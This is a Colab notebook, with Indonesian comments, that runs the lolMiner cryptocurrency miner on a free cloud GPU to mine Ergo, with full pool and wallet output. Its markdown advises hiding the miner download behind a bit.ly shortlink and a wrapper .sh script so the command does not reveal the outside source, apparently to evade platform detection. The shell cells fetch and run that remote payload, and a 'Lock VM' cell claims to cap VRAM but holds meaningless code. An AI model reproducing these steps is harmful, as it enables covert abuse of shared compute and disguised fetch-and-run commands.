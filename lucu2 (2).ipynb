{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "lucu2.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "_UAJP7QCHkac"
      },
      "source": [
        "**`LOCK VM = Semacam kek buat lock kinerja vram dibatasi biar engga ampe maximum tanpa mengurangi hashrate mining di algo apa aja`**"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "iskFIXwEHjVd"
      },
      "source": [
        "#@title Lock VM { run: \"auto\" }\n",
        "from numba import jit, cuda\n",
        "import numpy as np\n",
        "# to measure exec time\n",
        "from timeit import default_timer as timer\n",
        "\n",
        "# normal function to run on cpu\n",
        "def func(a):\t\t\t\t\t\t\t\t\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\t\n",
        "\n",
        "\t\t\t\t\t\t\n",
        "def func2(a):\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\n",
        "if __name__==\"__main__\":\n",
        "\tn = 10000000\t\t\t\t\t\t\t\n",
        "\ta = np.ones(n, dtype = np.float64)\n",
        "\tb = np.ones(n, dtype = np.float32)\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc(a)\n",
        "\tprint(\"without GPU:\", timer()-start)\t\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc2(a)\n",
        "\tprint(\"with GPU:\", timer()-start)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "_4lciA3rIONZ",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "44ffe4df-30b0-4611-e190-d2dc126fc8b3"
      },
      "source": [
        "!nvidia-smi -L"
      ],
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "GPU 0: Tesla T4 (UUID: GPU-316413fa-1cd7-e8d8-bc0c-e54356d010f9)\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "KSQINt19IK97"
      },
      "source": [
        "- `USAHAKAN MINER DI BIKIN REPO / DI UPLOAD FILE FTP BEBAS.. YANG PENTING COMMAND PANGGIL ENGGA DI LUAR.. SEMUA DI BUNGKUS DI FILE .sh + DI TAMBAHKAN SHORTLINK DI LINK DOWNLOAD REPO NYA.`\n",
        "\n",
        "- `CONTOH :`\n",
        "    - `!wget http://188.227.85.35:81/aria2/dl/Miner.zip di kasih shortlink jadi !wget https://bit.ly/Miner`\n",
        "\n",
        "- `UNZIP FILE MINER YANG DI SHORTLINK :`\n",
        "    - `!wget https://bit.ly/Miner && unzip Miner`"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "bxyHYAhoIL2L",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "969aff9e-2a61-4401-9d70-adf2dda148d7"
      },
      "source": [
        "!wget https://bit.ly/3wyizi3 && unzip 3wyizi3 && cp /content/alat-main/miner.zip /content/ && unzip miner.zip && chmod +x /content/miner/lolMiner && chmod 777 /content/miner/mine_ergo.sh && /content/miner/mine_ergo.sh"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "--2021-07-13 08:23:23--  https://bit.ly/3wyizi3\n",
            "Resolving bit.ly (bit.ly)... 67.199.248.10, 67.199.248.11\n",
            "Connecting to bit.ly (bit.ly)|67.199.248.10|:443... connected.\n",
            "HTTP request sent, awaiting response... 301 Moved Permanently\n",
            "Location: https://github.com/rajakura/alat/archive/refs/heads/main.zip [following]\n",
            "--2021-07-13 08:23:23--  https://github.com/rajakura/alat/archive/refs/heads/main.zip\n",
            "Resolving github.com (github.com)... 192.30.255.112\n",
            "Connecting to github.com (github.com)|192.30.255.112|:443... connected.\n",
            "HTTP request sent, awaiting response... 302 Found\n",
            "Location: https://codeload.github.com/rajakura/alat/zip/refs/heads/main [following]\n",
            "--2021-07-13 08:23:24--  https://codeload.github.com/rajakura/alat/zip/refs/heads/main\n",
            "Resolving codeload.github.com (codeload.github.com)... 192.30.255.120\n",
            "Connecting to codeload.github.com (codeload.github.com)|192.30.255.120|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: unspecified [application/zip]\n",
            "Saving to: ‘3wyizi3’\n",
            "\n",
            "3wyizi3                 [ <=>                ]   4.99M  --.-KB/s    in 0.1s    \n",
            "\n",
            "2021-07-13 08:23:24 (37.8 MB/s) - ‘3wyizi3’ saved [5234672]\n",
            "\n",
            "Archive:  3wyizi3\n",
            "97937313dbc55b595536cd50887a5b98415339f9\n",
            "   creating: alat-main/\n",
            "  inflating: alat-main/miner.zip     \n",
            "Archive:  miner.zip\n",
            "   creating: miner/\n",
            "  inflating: miner/4G_Ethash_Linux_Readme.txt  \n",
            "  inflating: miner/emergency.sh      \n",
            "  inflating: miner/example_zil_linux.tar.xz  \n",
            "  inflating: miner/license.txt       \n",
            "   creating: miner/logs/\n",
            "  inflating: miner/lolMiner          \n",
            "  inflating: miner/lolMiner.cfg      \n",
            "  inflating: miner/mine_ae.sh        \n",
            "  inflating: miner/mine_beam.sh      \n",
            "  inflating: miner/mine_bittube.sh   \n",
            "  inflating: miner/mine_btg.sh       \n",
            "  inflating: miner/mine_cortex.sh    \n",
            "  inflating: miner/mine_ergo.sh      \n",
            "  inflating: miner/mine_etc.sh       \n",
            "  inflating: miner/mine_eth.sh       \n",
            "  inflating: miner/mine_grin_32.sh   \n",
            "  inflating: miner/mine_zel.sh       \n",
            "  inflating: miner/readme.txt        \n",
            "  inflating: miner/split_mine_eth_etc.sh  \n",
            "\u001b[1m\u001b[38;2;100;149;237m+---------------------------------------------------------+\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m    _       _ __  __ _                   _   _____ _     \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m   | | ___ | |  \\/  (_)_ __   ___ _ __  / | |___ // |    \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m   | |/ _ \\| | |\\/| | | '_ \\ / _ \\ '__| | |   |_ \\| |    \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m   | | (_) | | |  | | | | | |  __/ |    | |_ ___) | |    \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m   |_|\\___/|_|_|  |_|_|_| |_|\\___|_|    |_(_)____/|_|    \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m                                                         \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              This software is for mining                \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Autolykos V2                               \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Ethash, Etchash                            \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Equihash 144/5, 192/7, 210/9               \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              BeamHash III                               \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              ZelHash     (EquihashR 125/4/0)            \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Cuck(ar)oo 29                              \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Cuckaroo   30 CTX                          \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Cuckatoo   31/32                           \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m                                                         \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m                                                         \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m             Made by Lolliedieb, July 2021               \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m+---------------------------------------------------------+\n",
            "\u001b[0m\n",
            "Setup Miner... \n",
            "OpenCL driver detected.\n",
            "Number of OpenCL supported GPUs: 1 \n",
            "Cuda driver detected.\n",
            "Number of Cuda supported GPUs: 1 \n",
            "Device 0: \n",
            "    Name:    \u001b[38;2;000;128;000mTesla T4 \n",
            "\u001b[0m    Address: 0:4 \n",
            "    Vendor:  NVIDIA Corporation\n",
            "    Drivers: Cuda\n",
            "    Memory:  15109 MByte \n",
            "    Active:  true (Selected Algorithm: Autolykos V2 (Ergo) 3G Cuda) \n",
            "\n",
            "Connecting to pool... \n",
            "\u001b[38;2;240;230;140mConnected to us.ergo.herominers.com:10250  (TLS disabled)\n",
            "\u001b[0m\u001b[38;2;240;230;140mSubscribed to stratum server\n",
            "\u001b[0m\u001b[38;2;240;230;140mAuthorized worker: 9iBQygF3jotYsT1JogiGvfdC7Ve8pLrPuqyqX5KR6kudFMn4eSs.lolsaja \n",
            "\u001b[0m\u001b[38;2;189;183;107mNew job received: 0 Height: 530962 Target: 0000000112E0BE82... \n",
            "\u001b[0mStart Mining... \n",
            "GPU \u001b[38;2;240;230;140m0\u001b[0m: building Ergo dataset for height 530962 \u001b[1m\u001b[38;2;180;242;130mcompleted\u001b[0m (3237 ms)\n",
            "Average speed (30s): 49.22 mh/s \n",
            "\u001b[1m\u001b[38;2;180;242;130mGPU 0: Found a share of difficulty 7.24G \n",
            "\u001b[0m\u001b[1m\u001b[38;2;180;242;130mGPU 0: Share accepted (6 ms) \n",
            "\u001b[0mAverage speed (30s): 58.92 mh/s \n",
            "\u001b[38;2;189;183;107mNew job received: 1 Height: 530963 Target: 0000000112E0BE82... \n",
            "\u001b[0mGPU \u001b[38;2;240;230;140m0\u001b[0m: building Ergo dataset for height 530963 \u001b[1m\u001b[38;2;180;242;130mcompleted\u001b[0m (3357 ms)\n",
            "Average speed (30s): 52.30 mh/s \n",
            "\u001b[1m\u001b[38;2;180;242;130mGPU 0: Found a share of difficulty 4.65G \n",
            "\u001b[0m\u001b[1m\u001b[38;2;180;242;130mGPU 0: Share accepted (6 ms) \n",
            "\u001b[0m\u001b[1m\u001b[38;2;180;242;130mGPU 0: Found a share of difficulty 10.71G \n",
            "\u001b[0m\u001b[1m\u001b[38;2;180;242;130mGPU 0: Share accepted (6 ms) \n",
            "\u001b[0m\u001b[38;2;189;183;107mNew job received: 2 Height: 530964 Target: 0000000112E0BE82... \n",
            "\u001b[0mAverage speed (30s): 53.67 mh/s \n",
            "GPU \u001b[38;2;240;230;140m0\u001b[0m: building Ergo dataset for height 530964 \u001b[1m\u001b[38;2;180;242;130mcompleted\u001b[0m (3448 ms)\n",
            "\u001b[38;2;189;183;107mNew job received: 3 Height: 530965 Target: 0000000112E0BE82... \n",
            "\u001b[0mGPU \u001b[38;2;240;230;140m0\u001b[0m: building Ergo dataset for height 530965 \u001b[1m\u001b[38;2;180;242;130mcompleted\u001b[0m (3485 ms)\n",
            "\u001b[1m\u001b[38;2;180;242;130mGPU 0: Found a share of difficulty 11.61G \n",
            "\u001b[0m\u001b[1m\u001b[38;2;180;242;130mGPU 0: Share accepted (5 ms) \n",
            "\u001b[0m\u001b[38;2;100;149;237m--------------------------------------------- \n",
            "\u001b[0m\u001b[38;2;100;149;237mStatistics (08:25:55); Mining: Autolykos V2 (Ergo) \n",
            "\u001b[0m\u001b[38;2;100;149;237mConnected to: us.ergo.herominers.com:10250 \n",
            "\u001b[0m\u001b[38;2;100;149;237mUptime: 0h 2m 30s \n",
            "\u001b[0m\u001b[38;2;100;149;237m                    \u001b[0m\u001b[38;2;100;149;237m      GPU 0\u001b[0m\u001b[38;2;100;149;237m    Total\u001b[0m\u001b[38;2;100;149;237m\n",
            "\u001b[0m\u001b[38;2;100;149;237mName:               \u001b[0m\u001b[38;2;100;149;237m   Tesla T4\u001b[0m\u001b[38;2;100;149;237m      Rig\u001b[0m\u001b[38;2;100;149;237m\n",
            "\u001b[0m\u001b[38;2;100;149;237mSpeed (mh/s):       \u001b[0m\u001b[38;2;100;149;237m      52.86\u001b[0m\u001b[38;2;100;149;237m    52.86\u001b[0m\u001b[38;2;100;149;237m\n",
            "\u001b[0m\u001b[38;2;100;149;237mPool (mh/s):        \u001b[0m\u001b[38;2;100;149;237m     106.67\u001b[0m\u001b[38;2;100;149;237m   106.67\u001b[0m\u001b[38;2;100;149;237m\n",
            "\u001b[0m\u001b[38;2;100;149;237mShares (A/R):       \u001b[0m\u001b[38;2;100;149;237m        4/0\u001b[0m\u001b[38;2;100;149;237m      4/0\u001b[0m\u001b[38;2;100;149;237m\n",
            "\u001b[0m\u001b[38;2;100;149;237mBest Share:         \u001b[0m\u001b[38;2;100;149;237m      11.6G\u001b[0m\u001b[38;2;100;149;237m    11.6G\u001b[0m\u001b[38;2;100;149;237m\n",
            "\u001b[0m\u001b[38;2;100;149;237mPower (W):          \u001b[0m\u001b[38;2;100;149;237m       70.0\u001b[0m\u001b[38;2;100;149;237m     70.0\u001b[0m\u001b[38;2;100;149;237m\n",
            "\u001b[0m\u001b[38;2;100;149;237mEfficiency (mh/s/W):\u001b[0m\u001b[38;2;100;149;237m      0.750\u001b[0m\u001b[38;2;100;149;237m    0.750\u001b[0m\u001b[38;2;100;149;237m\n",
            "\u001b[0m\u001b[38;2;100;149;237mTemp (deg C):       \u001b[0m\u001b[38;2;100;149;237m         77\u001b[0m\u001b[38;2;100;149;237m         \u001b[0m\u001b[38;2;100;149;237m\n",
            "\u001b[0m\u001b[38;2;100;149;237mFan Speed (%):      \u001b[0m\u001b[38;2;100;149;237m          0\u001b[0m\u001b[38;2;100;149;237m         \u001b[0m\u001b[38;2;100;149;237m\n",
            "\u001b[0m\u001b[38;2;100;149;237m--------------------------------------------- \n",
            "\u001b[0mAverage speed (30s): 50.20 mh/s \n",
            "\u001b[1m\u001b[38;2;180;242;130mGPU 0: Found a share of difficulty 5.68G \n",
            "\u001b[0m\u001b[1m\u001b[38;2;180;242;130mGPU 0: Share accepted (6 ms) \n",
            "\u001b[0mAverage speed (30s): 58.65 mh/s \n",
            "Average speed (30s): 58.65 mh/s \n",
            "Average speed (30s): 58.79 mh/s \n",
            "Average speed (30s): 58.65 mh/s \n",
            "\u001b[38;2;189;183;107mNew job received: 4 Height: 530966 Target: 0000000112E0BE82... \n",
            "\u001b[0mGPU \u001b[38;2;240;230;140m0\u001b[0m: building Ergo dataset for height 530966 \u001b[1m\u001b[38;2;180;242;130mcompleted\u001b[0m (3445 ms)\n",
            "\u001b[38;2;100;149;237m--------------------------------------------- \n",
            "\u001b[0m\u001b[38;2;100;149;237mStatistics (08:28:25); Mining: Autolykos V2 (Ergo) \n",
            "\u001b[0m\u001b[38;2;100;149;237mConnected to: us.ergo.herominers.com:10250 \n",
            "\u001b[0m\u001b[38;2;100;149;237mUptime: 0h 5m 0s \n",
            "\u001b[0m\u001b[38;2;100;149;237m                    \u001b[0m\u001b[38;2;100;149;237m      GPU 0\u001b[0m\u001b[38;2;100;149;237m   Total\u001b[0m\u001b[38;2;100;149;237m\n",
            "\u001b[0m\u001b[38;2;100;149;237mName:               \u001b[0m\u001b[38;2;100;149;237m   Tesla T4\u001b[0m\u001b[38;2;100;149;237m     Rig\u001b[0m\u001b[38;2;100;149;237m\n",
            "\u001b[0m\u001b[38;2;100;149;237mSpeed (mh/s):       \u001b[0m\u001b[38;2;100;149;237m      57.34\u001b[0m\u001b[38;2;100;149;237m   57.34\u001b[0m\u001b[38;2;100;149;237m\n",
            "\u001b[0m\u001b[38;2;100;149;237mPool (mh/s):        \u001b[0m\u001b[38;2;100;149;237m      66.67\u001b[0m\u001b[38;2;100;149;237m   66.67\u001b[0m\u001b[38;2;100;149;237m\n",
            "\u001b[0m\u001b[38;2;100;149;237mShares (A/R):       \u001b[0m\u001b[38;2;100;149;237m        5/0\u001b[0m\u001b[38;2;100;149;237m     5/0\u001b[0m\u001b[38;2;100;149;237m\n",
            "\u001b[0m\u001b[38;2;100;149;237mBest Share:         \u001b[0m\u001b[38;2;100;149;237m      11.6G\u001b[0m\u001b[38;2;100;149;237m   11.6G\u001b[0m\u001b[38;2;100;149;237m\n",
            "\u001b[0m\u001b[38;2;100;149;237mPower (W):          \u001b[0m\u001b[38;2;100;149;237m       69.6\u001b[0m\u001b[38;2;100;149;237m    69.6\u001b[0m\u001b[38;2;100;149;237m\n",
            "\u001b[0m\u001b[38;2;100;149;237mEfficiency (mh/s/W):\u001b[0m\u001b[38;2;100;149;237m      0.818\u001b[0m\u001b[38;2;100;149;237m   0.818\u001b[0m\u001b[38;2;100;149;237m\n",
            "\u001b[0m\u001b[38;2;100;149;237mTemp (deg C):       \u001b[0m\u001b[38;2;100;149;237m         77\u001b[0m\u001b[38;2;100;149;237m        \u001b[0m\u001b[38;2;100;149;237m\n",
            "\u001b[0m\u001b[38;2;100;149;237mFan Speed (%):      \u001b[0m\u001b[38;2;100;149;237m          0\u001b[0m\u001b[38;2;100;149;237m        \u001b[0m\u001b[38;2;100;149;237m\n",
            "\u001b[0m\u001b[38;2;100;149;237m--------------------------------------------- \n",
            "\u001b[0mAverage speed (30s): 51.97 mh/s \n",
            "\u001b[38;2;189;183;107mNew job received: 5 Height: 530967 Target: 0000000112E0BE82... \n",
            "\u001b[0m"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "nF5yibM5ei7I"
      },
      "source": [
        "!cp /content/miner/lolMiner /content/\n",
        "!cp /content/miner/mine_ergo.sh /content/"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "WfcEZyYdfuLs",
        "outputId": "1eee5566-c133-4b09-b20c-8fafd8435f54"
      },
      "source": [
        "!chmod +x ./mine_ergo.sh && ./mine_ergo.sh"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "\u001b[1m\u001b[38;2;100;149;237m+---------------------------------------------------------+\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m    _       _ __  __ _                   _   _____ _     \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m   | | ___ | |  \\/  (_)_ __   ___ _ __  / | |___ // |    \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m   | |/ _ \\| | |\\/| | | '_ \\ / _ \\ '__| | |   |_ \\| |    \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m   | | (_) | | |  | | | | | |  __/ |    | |_ ___) | |    \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m   |_|\\___/|_|_|  |_|_|_| |_|\\___|_|    |_(_)____/|_|    \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m                                                         \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              This software is for mining                \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Autolykos V2                               \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Ethash, Etchash                            \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Equihash 144/5, 192/7, 210/9               \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              BeamHash III                               \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              ZelHash     (EquihashR 125/4/0)            \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Cuck(ar)oo 29                              \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Cuckaroo   30 CTX                          \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Cuckatoo   31/32                           \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m                                                         \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m                                                         \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m             Made by Lolliedieb, July 2021               \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m+---------------------------------------------------------+\n",
            "\u001b[0m\n",
            "Setup Miner... \n",
            "OpenCL driver detected.\n",
            "Number of OpenCL supported GPUs: 1 \n",
            "Cuda driver detected.\n",
            "Number of Cuda supported GPUs: 1 \n",
            "Device 0: \n",
            "    Name:    \u001b[38;2;000;128;000mTesla T4 \n",
            "\u001b[0m    Address: 0:4 \n",
            "    Vendor:  NVIDIA Corporation\n",
            "    Drivers: Cuda\n",
            "    Memory:  15109 MByte \n",
            "    Active:  true (Selected Algorithm: Autolykos V2 (Ergo) 3G Cuda) \n",
            "\n",
            "Connecting to pool... \n",
            "\u001b[38;2;240;230;140mConnected to us.ergo.herominers.com:10250  (TLS disabled)\n",
            "\u001b[0m\u001b[38;2;240;230;140mSubscribed to stratum server\n",
            "\u001b[0m\u001b[38;2;240;230;140mAuthorized worker: 9iBQygF3jotYsT1JogiGvfdC7Ve8pLrPuqyqX5KR6kudFMn4eSs.lolsaja \n",
            "\u001b[0m\u001b[38;2;189;183;107mNew job received: 0 Height: 530482 Target: 0000000112E0BE82... \n",
            "\u001b[0mStart Mining... \n",
            "GPU \u001b[38;2;240;230;140m0\u001b[0m: building Ergo dataset for height 530482 \u001b[1m\u001b[38;2;180;242;130mcompleted\u001b[0m (3118 ms)\n",
            "Average speed (30s): 49.02 mh/s \n"
          ],
          "name": "stdout"
        }
      ]
    }
  ]
}